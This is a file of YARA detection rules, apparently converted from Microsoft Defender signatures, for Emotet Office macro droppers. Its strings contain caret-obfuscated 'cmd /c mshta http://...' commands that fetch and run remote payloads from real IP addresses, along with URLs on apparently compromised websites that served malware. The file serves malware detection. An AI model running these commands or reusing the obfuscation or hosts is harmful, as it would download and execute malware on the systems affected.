rule TrojanDropper_O97M_Emotet_BKB_2147808338_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Emotet.BKB!MTB"
        threat_id = "2147808338"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cmd /c m^sh^t^a h^tt^p^:/^/87.251.86.178/pp/_.html" ascii //weight: 1
        $x_1_2 = "CMD.EXE /c mshta http://91.240.118.172/gg/ff/fe.html" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDropper_O97M_Emotet_BKC_2147808373_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Emotet.BKC!MTB"
        threat_id = "2147808373"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cmd /c m^sh^t^a h^tt^p^:/^/87.251.85.100/love3/_.html" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Emotet_BOEY_2147812045_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Emotet.BOEY!MTB"
        threat_id = "2147812045"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://terrassa-cafe.com/9yjxnes/18p2S7bBrdpM6FrAc/" ascii //weight: 1
        $x_1_2 = "://moseletronicos.com/wp-content/5/" ascii //weight: 1
        $x_1_3 = "://sabaithaimass age.com.au/wp-admin/Hgbn3e/" ascii //weight: 1
        $x_1_4 = "://wiremax.avaspadan.com/admin/ItopibIZF3dxpy0/" ascii //weight: 1
        $x_1_5 = "://troopsites.com/wp-admin/CzMJm2vfbA4osSHH/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

